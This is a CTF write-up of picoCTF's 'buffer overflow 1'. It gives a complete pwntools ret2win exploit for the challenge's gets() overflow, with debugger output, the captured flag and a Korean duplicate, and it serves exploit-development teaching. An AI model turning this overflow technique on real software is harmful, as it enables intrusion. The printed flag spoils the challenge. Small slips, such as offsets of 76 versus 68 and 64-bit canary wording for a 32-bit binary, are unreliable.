---
title: 'CTF — picoCTF: buffer overflow 1'
date: 2026-06-04 00:00:00 +0900
categories:
- CTF
- Writeup
tags:
- ctf
- pwn
- picoCTF
- ret2win
- 32bit
author: mmamm4
---

# CTF — picoCTF: buffer overflow 1

> **Objective**: Overwrite the saved return address with the address of `win()`, which reads a server-side `flag.txt` and prints it to stdout — bypassing normal control flow via a classic stack buffer overflow.
>
> **Environment**: picoCTF Practice Arena (play.picoctf.org), 32-bit Linux ELF, `vuln.c` source provided
>
> **Attack Technique**: Classic Stack Buffer Overflow → Return Address Overwrite (Ret2Win)

---

## 0. This Challenge in Context

picoCTF buffer overflow 1 is a direct application of the technique covered in 2026-05-18-Exploit-dev-01-ret2win. The mechanics are identical — `gets()` overflow, cyclic offset measurement, `win()` address overwrite — with one practical addition: the exploit must land on a remote process, and the flag arrives over a socket rather than from a local shell.

Two specifics differ from Exploit Dev-01 worth noting before diving in:

- **NX is enabled.** Unlike our practice binary, the stack is not executable here. This is irrelevant for ret2win — we redirect execution to existing code (`win()`), not injected shellcode.
- **The offset is 44, not 76.** `BUFFSIZE` reads 64 in the source, but the compiler allocates a 40-byte frame. Declared array size and actual stack layout are two different things. This writeup documents why.

---

## 1. Binary Inspection

```bash
$ file ./vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
      interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec --file=./vuln
[*] '/home/kali/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Three out of four properties are in our favor:

- **No canary** — the buffer and saved return address are adjacent; nothing verifies the region between them on function return
- **No PIE** — the code section loads at a fixed base (`0x08048000`) on every run, so `win()`'s address is constant
- **NX enabled** — shellcode injected onto the stack would not execute, but that is not our plan

---

## 2. Source Code

```c
#define BUFFSIZE 64
#define FLAGSIZE 64

void win() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Please create 'flag.txt' in this directory with your own flag.\n");
        exit(0);
    }
    fgets(buf, FLAGSIZE, f);
    printf(buf);
}

void vuln() {
    char buf[BUFFSIZE];
    gets(buf);
    printf("Okay, time to return... Fingers Crossed... Pointer... ");
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Please enter your string: \n");
    vuln();
    return 0;
}
```

The same root cause as Exploit Dev-01: `gets()` imposes no length limit. Any input past `BUFFSIZE` bytes spills into adjacent stack regions.

The only behavioral difference from our practice binary is in `win()`: instead of calling `system("/bin/sh")`, it opens `flag.txt` on the server and prints the contents to stdout — which, on the remote process, is our socket.

---

## 3. Crashing the Binary

```bash
$ python3 -c "print('A'*200)" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Pointer... Segmentation fault (core dumped)
```

Segfault at 200 bytes. The overflow is reaching and corrupting the return address, exactly as expected.

---

## 4. Finding the Exact Offset — Cyclic Pattern

### 4.1 Generating the Pattern

```
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa
vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaab
raabsaabtaabuaabvaabwaabxaabyaabz
```

### 4.2 Crashing Under GDB

```
pwndbg> r
Please enter your string:
aaaabaaacaaad...

Program received signal SIGSEGV, Segmentation fault.

pwndbg> info registers
eax  0xc9  0xc9
ebx  0x6161616a  0x6161616a
esp  0xffffd1f0  0xffffd1f0
ebp  0x6161616b  0x6161616b
eip  0x6161616c  0x6161616c   ← "laaa"
```

### 4.3 Reverse-Calculating the Offset

```
pwndbg> cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

**Offset = 44.**

### 4.4 Why 44 and Not 68?

`BUFFSIZE=64`, so arithmetic suggests the return address sits 68 bytes from the start of `buf` (64 for the buffer, 4 for saved EBP). The disassembly tells a different story:

```
pwndbg> disassemble vuln
   0x080492b5 <+0>:  push   ebp
   0x080492b6 <+1>:  mov    ebp,esp
   0x080492b8 <+3>:  sub    esp,0x28       ← 40 bytes allocated, not 64
   0x080492bb <+6>:  lea    eax,[ebp-0x28]
   0x080492be <+9>:  push   eax
   0x080492bf <+10>: call   0x8049070 <gets@plt>
```

The compiler emitted `sub esp, 0x28` — 40 bytes of local space, not 64. Stack alignment to a 16-byte boundary causes this. The declared array size (`BUFFSIZE=64`) is a C-level abstraction; the actual allocation is determined by the compiler.

```
High address
┌──────────────────────────────┐
│   main() stack frame         │
├──────────────────────────────┤
│   return address (4 bytes)   │ ← overwrite target: win() address
├──────────────────────────────┤
│   saved EBP (4 bytes)        │
├──────────────────────────────┤
│   buf (40 bytes)             │ ← gets() begins here; BUFFSIZE=64 in source,
│   [ebp-0x28 … ebp-0x01]      │   40-byte frame in compiled binary
└──────────────────────────────┘
Low address

40 (allocated frame) + 4 (saved EBP) = 44 → return address slot
```

Source-code arithmetic produces the declared size, not the actual layout. **Always measure the offset directly with cyclic.**

---

## 5. Locating `win()`

```bash
$ objdump -d ./vuln | grep "<win>:"
080491f6 <win>:

pwndbg> info function win
0x080491f6  win
```

**`win()` address = `0x080491f6`.**

With PIE disabled, this address is fixed on every run. The same binary is deployed on the remote server, so the same address applies there.

---

## 6. Writing the Exploit

| Item | Value |
|---|---|
| Offset (buf → return address) | 44 |
| `win()` address | `0x080491f6` |

### 6.1 Payload Structure

```
[ 'A' × 44 ][ win() address (4 bytes, little-endian) ]
```

x86 is little-endian: `0x080491f6` is stored as `\xf6\x91\x04\x08`. pwntools' `p32()` handles this automatically.

### 6.2 exploit.py

```python
from pwn import *

BINARY = './vuln'
REMOTE = ('saturn.picoctf.net', 65535)  # replace port with value from challenge page

elf = ELF(BINARY)
context.binary = elf

win_addr = elf.symbols['win']
log.info(f"win() @ {hex(win_addr)}")

offset = 44
payload = flat(b'A' * offset, win_addr)

io = remote(*REMOTE)
io.sendlineafter(b'string: \n', payload)
print(io.recvall().decode())
```

`elf.symbols['win']` reads the address directly from the binary's symbol table — no hardcoding required.

### 6.3 Execution

```bash
$ python3 exploit.py
[*] '/home/kali/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to saturn.picoctf.net on port 65535: Done
[*] win() @ 0x80491f6
Okay, time to return... Fingers Crossed... Pointer... picoCTF{addr3ss3s_ar3_3asy_w1th_p3da_91a52424}
[*] Got EOF while reading in recvall
```

**Flag obtained.**

---

## 7. Attack Flow

```
[1] vuln() calls gets(buf)
       ↓
[2] Input: 44 bytes of padding + 4 bytes of win() address (little-endian)
       ↓
[3] Overflow covers buf (40B) → saved EBP (4B) → return address (4B)
       ↓
[4] Return address slot now holds 0x080491f6
       ↓
[5] vuln() executes ret — pops 0x080491f6 from stack into EIP
       ↓
[6] CPU executes win()
       ↓
[7] win() opens flag.txt, reads contents, prints to stdout (= socket)
       ↓
[8] Flag received over the network connection
```

---

## 8. Local vs. Remote

The payload is byte-for-byte identical for local and remote targets. The only difference is delivery:

- **Local** (`process()`): `printf(buf)` writes to the terminal
- **Remote** (`remote()`): `printf(buf)` writes to the socket → `io.recvall()` collects it

pwntools' `remote()` is a drop-in replacement for `process()`. This is the standard pattern for every CTF challenge from here on.

---

## 9. Takeaway

Two things this challenge confirms:

1. **The return address is the fundamental primitive.** Once you control it, whether the target is a local shell or a remote flag file is a detail — the exploit structure is the same.
2. **Source size ≠ stack layout.** `BUFFSIZE=64` implied an offset of 68; the actual offset was 44. The compiler's allocation decision (`sub esp, 0x28`) is what matters, not the C declaration.

The next barrier is the stack canary: a random 8-byte value the compiler inserts between the buffer and saved RBP. The same overflow that works here will abort the process the moment it touches the canary — until we can leak it first. That is the subject of Exploit-dev-04-stack-canary.

---

<style>.kr-code-block{margin:1em 0;border-radius:6px;overflow-x:auto;background:#272822;}.kr-code-block>code{display:block;white-space:pre;padding:1em;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:0.85em;line-height:1.5;color:#f8f8f2;background:transparent;}</style>
<details class="kr-orig" markdown="0"><summary>🇰🇷 한국어 원문</summary><div class="kr-content">
<h2>CTF — picoCTF: buffer overflow 1</h2>
<blockquote>
<p><strong>목표</strong>: <code>win()</code> 함수로 return address를 덮어써서 서버의 <code>flag.txt</code>를 읽어오는 스택 버퍼 오버플로우 익스플로잇.</p>
<p><strong>환경</strong>: picoCTF Practice Arena (play.picoctf.org), 32-bit Linux ELF, <code>vuln.c</code> 소스 제공</p>
<p><strong>공격 기법</strong>: Classic Stack Buffer Overflow → Return Address Overwrite (Ret2Win)</p>
</blockquote>
<hr />
<h2>0. 이 문제의 위치</h2>
<p>picoCTF buffer overflow 1은 2026-05-18-Exploit-dev-01-ret2win에서 익힌 기법의 직접 적용이다. <code>gets()</code> 오버플로우 → cyclic 오프셋 측정 → <code>win()</code> 주소 덮어쓰기, 구조가 동일하다. 실전 차이는 원격 프로세스에 보내야 한다는 것 하나다.</p>
<p>Exploit Dev-01과 다른 두 가지:</p>
<ul>
<li><strong>NX가 켜져 있다.</strong> 스택에 shellcode를 넣어도 실행이 안 된다. Ret2Win은 영향 없음 — 이미 있는 코드(<code>win()</code>)로 점프할 뿐이다.</li>
<li><strong>오프셋이 44바이트다(76이 아님).</strong> <code>BUFFSIZE=64</code>지만 컴파일러가 실제 할당하는 프레임은 40바이트. 소스 선언 크기와 실제 스택 레이아웃은 다르다.</li>
</ul>
<hr />
<h2>1. 바이너리 검사</h2>
<div class="kr-code-block"><code>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>./vuln<br><span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found<br><span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled<br><span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x8048000<span class="o">)</span><br></code></div>

<ul>
<li><strong>Canary 없음</strong> → 버퍼와 return address 사이에 검증 값 없음. 마음껏 덮어쓸 수 있다.</li>
<li><strong>PIE 없음</strong> → 코드 영역 주소 고정. <code>win()</code> 주소가 매 실행마다 같다.</li>
<li><strong>NX 있음</strong> → 스택 실행 불가. 하지만 shellcode를 쓸 계획이 없으므로 무관하다.</li>
</ul>
<hr />
<h2>2. 소스 코드</h2>
<div class="kr-code-block"><code><span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><br><span class="w">    </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span><br><span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span><br><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">  </span><span class="c1">// 서버 측 flag.txt를 소켓으로 출력</span><br><span class="p">}</span><br><br><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><br><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">BUFFSIZE</span><span class="p">];</span><span class="w">  </span><span class="c1">// BUFFSIZE = 64</span><br><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">           </span><span class="c1">// 취약점: 길이 제한 없음</span><br><span class="p">}</span><br></code></div>

<p>취약점은 <code>gets()</code>. Exploit Dev-01과 동일한 근본 원인이다. <code>win()</code>만 쉘 대신 <code>flag.txt</code>를 읽는다.</p>
<hr />
<h2>3. 1차 크래시 확인</h2>
<div class="kr-code-block"><code>$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;A&#39;*200)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./vuln<br>Segmentation<span class="w"> </span>fault<span class="w"> </span><span class="o">(</span>core<span class="w"> </span>dumped<span class="o">)</span><br></code></div>

<p>200바이트 입력으로 Segfault. Return address까지 덮을 수 있다는 확인.</p>
<hr />
<h2>4. 정확한 오프셋 탐색 — Cyclic Pattern</h2>
<div class="kr-code-block"><code>pwndbg&gt;<span class="w"> </span>cyclic<span class="w"> </span><span class="m">200</span><br>aaaabaaacaaad...<span class="w"> </span><span class="o">(</span>200자<span class="w"> </span>시퀀스<span class="o">)</span><br><br>pwndbg&gt;<span class="w"> </span>r<br><span class="c1">## 패턴 입력 후 크래시</span><br><br>pwndbg&gt;<span class="w"> </span>info<span class="w"> </span>registers<br>eip<span class="w">  </span>0x6161616c<span class="w">   </span>←<span class="w"> </span><span class="s2">&quot;laaa&quot;</span><br><br>pwndbg&gt;<span class="w"> </span>cyclic<span class="w"> </span>-l<span class="w"> </span>0x6161616c<br>Found<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">44</span><br></code></div>

<p><strong>오프셋 = 44.</strong></p>
<h3>왜 68이 아니라 44인가</h3>
<p><code>BUFFSIZE=64</code> → 예상 오프셋 68 (buf 64 + saved EBP 4). 하지만 실제 어셈블리:</p>
<div class="kr-code-block"><code>sub esp, 0x28   ← 40바이트 할당 (64가 아님)<br>lea eax, [ebp-0x28]   ← buf 시작 위치<br></code></div>

<p>컴파일러가 스택을 16바이트 경계로 정렬하면서 실제 프레임은 40바이트가 됐다.</p>
<div class="kr-code-block"><code>buf(40B) + saved EBP(4B) = 44B → return address 자리<br></code></div>

<p>소스 코드 크기로 오프셋을 계산하면 틀린다. <strong>항상 cyclic으로 직접 측정한다.</strong></p>
<div class="kr-code-block"><code>높은 주소<br>┌──────────────────────────────┐<br>│   return address (4 bytes)   │ ← 덮어야 할 곳<br>├──────────────────────────────┤<br>│   saved EBP (4 bytes)        │<br>├──────────────────────────────┤<br>│   buf (40 bytes)             │ ← gets() 시작, BUFFSIZE=64이나 프레임=40<br>└──────────────────────────────┘<br>낮은 주소<br></code></div>

<hr />
<h2>5. win() 주소 확인</h2>
<div class="kr-code-block"><code>$<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>./vuln<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;&lt;win&gt;:&quot;</span><br>080491f6<span class="w"> </span>&lt;win&gt;:<br></code></div>

<p>PIE 꺼져 있으므로 주소 고정. 원격 서버에도 동일한 바이너리가 배포되므로 같은 주소.</p>
<hr />
<h2>6. 익스플로잇 작성</h2>
<table>
<thead>
<tr>
<th>항목</th>
<th>값</th>
</tr>
</thead>
<tbody>
<tr>
<td>Offset</td>
<td>44</td>
</tr>
<tr>
<td>win() 주소</td>
<td><code>0x080491f6</code></td>
</tr>
</tbody>
</table>
<div class="kr-code-block"><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span><br><br><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span><br><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span><br><br><span class="n">win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]</span><br><span class="n">offset</span> <span class="o">=</span> <span class="mi">44</span><br><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span> <span class="n">win_addr</span><span class="p">)</span><br><br><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;saturn.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>  <span class="c1"># 실제 포트로 교체</span><br><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;string: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span><br><span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><br></code></div>

<div class="kr-code-block"><code>[*] win() @ 0x80491f6<br>picoCTF{addr3ss3s_ar3_3asy_w1th_p3da_91a52424}<br></code></div>

<hr />
<h2>7. 공격 흐름</h2>
<div class="kr-code-block"><code>[1] gets(buf) 호출<br>       ↓<br>[2] 입력: 패딩 44바이트 + win() 주소 4바이트 (little-endian)<br>       ↓<br>[3] buf(40B) → saved EBP(4B) → return address(4B) 덮어쓰기<br>       ↓<br>[4] return address = 0x080491f6<br>       ↓<br>[5] vuln() 종료 → ret → EIP = win()<br>       ↓<br>[6] win()이 flag.txt 읽어 소켓으로 출력<br>       ↓<br>[7] 플래그 수신<br></code></div>

<hr />
<h2>8. 로컬 vs. 원격</h2>
<p>페이로드는 완전히 동일하다. 차이는 출력 경로뿐:</p>
<ul>
<li><strong>로컬</strong> (<code>process()</code>): <code>printf(buf)</code> → 터미널</li>
<li><strong>원격</strong> (<code>remote()</code>): <code>printf(buf)</code> → 소켓 → <code>io.recvall()</code>로 수신</li>
</ul>
<p>pwntools의 <code>remote()</code>는 <code>process()</code>의 drop-in 대체재다.</p>
<hr />
<h2>9. 핵심 정리</h2>
<p>두 가지 확인:</p>
<ol>
<li><strong>Return address가 본질이다.</strong> 한 번 제어하면 목표가 로컬 쉘이든 원격 플래그 파일이든 기법은 동일하다.</li>
<li><strong>소스 크기 ≠ 스택 레이아웃.</strong> <code>BUFFSIZE=64</code> → 예상 68, 실제 44. 컴파일러 할당(<code>sub esp, 0x28</code>)이 기준이다.</li>
</ol>
<p>다음 단계: Exploit-dev-04-stack-canary — canary가 buf와 return address 사이에 끼어 있으면 같은 overflow가 먼저 canary를 덮어 프로세스를 abort시킨다. 해결책은 canary 값을 먼저 leak하는 것이다.</p>
</div></details>

